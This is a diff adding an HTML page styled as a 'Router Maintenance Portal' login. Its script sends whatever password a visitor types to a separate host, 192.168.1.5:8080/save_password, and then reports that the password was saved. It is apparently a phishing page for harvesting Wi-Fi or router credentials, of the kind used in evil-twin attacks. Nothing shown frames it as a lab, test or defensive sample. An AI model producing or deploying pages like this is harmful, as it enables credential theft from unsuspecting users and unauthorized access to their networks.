@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Router Maintenance Portal</title>
+</head>
+<body>
+<h2>Router Maintenance Login</h2>
+<form id="loginForm">
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+    <button type="submit">Submit</button>
+</form>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var password = document.getElementById('password').value;
+    fetch('http://192.168.1.5:8080/save_password', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({password: password}),
+    })
+    .then(response => response.text())
+    .then(data => {
+        alert('Password saved successfully!');
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+});
+</script>
+</body>
+</html>
